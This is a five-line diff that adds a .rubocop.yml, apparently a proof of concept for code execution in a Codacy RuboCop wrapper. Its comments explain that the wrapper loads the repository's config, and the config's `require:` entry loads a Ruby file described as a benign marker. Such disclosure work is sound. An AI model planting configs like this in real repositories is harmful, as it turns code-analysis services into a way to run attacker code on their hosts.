@@ -1,0 +1,5 @@
+# PoC payload — benign marker only.
+# RCE via codacy-rubocop: wrapper passes cwd=/src and no -c on the no-patterns branch,
+# so RuboCop loads /src/.rubocop.yml. RuboCop's `require:` list is Kernel#require'd at config-load.
+require:
+  - ./codacy_rce_marker.rb
